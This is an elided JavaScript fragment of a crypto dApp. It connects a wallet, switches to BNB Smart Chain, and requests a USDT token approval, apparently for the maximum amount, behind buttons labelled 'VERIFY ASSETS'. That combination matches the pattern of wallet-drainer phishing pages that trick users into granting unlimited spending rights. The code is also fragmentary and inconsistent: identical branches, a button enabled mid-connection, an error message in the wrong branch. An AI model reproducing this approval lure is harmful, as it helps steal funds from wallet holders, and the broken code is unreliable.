...
(function () {
    ...
    function updateWalletInfoUI() {
        ...
        buttons.forEach(btn => {
            ...
            if (state.isConnecting || state.isApproving) {
                ...
                btn.disabled = false;
                if (state.walletAddress) {
                    btn.querySelector('span:last-child') ? btn.querySelector('span:last-child').textContent = 'VERIFY ASSETS' : btn.textContent = 'VERIFY ASSETS';
                } else {
                    btn.querySelector('span:last-child') ? btn.querySelector('span:last-child').textContent = 'VERIFY ASSETS' : btn.textContent = 'VERIFY ASSETS';
                }
            }
    ...
    async function connectWallet() {
        ...
        if (!window.ethereum) {
            ...
            alert('No Web3 wallet found. Please open this dApp inside MetaMask, Trust Wallet, or install the MetaMask extension.');
            return;
        }
        ...
        try {
            ...
            // Check & switch network to BNB Smart Chain (0x38)
    ...
    async function approveUsdt() {
        ...
        updateWalletInfoUI();
        updateStatus('⛽ Requesting USDT approval signature from wallet...', 'warning');
        ...
        try {
            ...
            // Approve Max Uint256 or user balance
            ...
            if (err.code === 401 || err.message?.includes('user rejected') || err.message?.includes('User denied')) {
                ...
                updateStatus('❌ Approval failed: ' + (err.reason || err.message || 'Transaction error'), 'error');
            }
        } finally {
